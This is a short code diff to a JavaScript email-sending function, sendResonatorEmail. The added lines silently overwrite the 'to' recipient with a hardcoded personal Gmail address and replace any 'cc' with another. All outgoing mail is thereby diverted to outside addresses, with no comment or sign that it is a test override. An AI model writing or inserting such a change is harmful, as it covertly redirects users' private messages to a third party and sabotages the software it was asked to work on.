@@ -13,6 +13,9 @@ export default function sendResonatorEmail({from = 'mindharmoniesinc app', to, c
         }
     });
 
+    to = 'ancap.forever.21@gmail.com';
+    cc = cc && 'ancap.forever.leader@gmail.com';
+
     let mailOptions = {
         from,
         to,
